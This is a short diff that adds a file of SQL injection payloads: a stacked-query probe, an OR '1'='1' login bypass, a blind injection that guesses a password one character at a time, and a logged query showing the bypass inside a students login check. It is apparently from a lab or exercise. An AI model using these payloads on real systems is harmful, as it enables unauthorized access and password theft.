@@ -1,0 +1,7 @@
+
+';  SELECT IF(1=1,'true','false'); --
+
+poop' OR '1'='1'); --
+poop' OR SUBSTR(password, 1, 1) > 'm'); --
+
+Executing query: SELECT * FROM students WHERE pid='A15753240' AND (password='poop' OR '1'='1'); --');
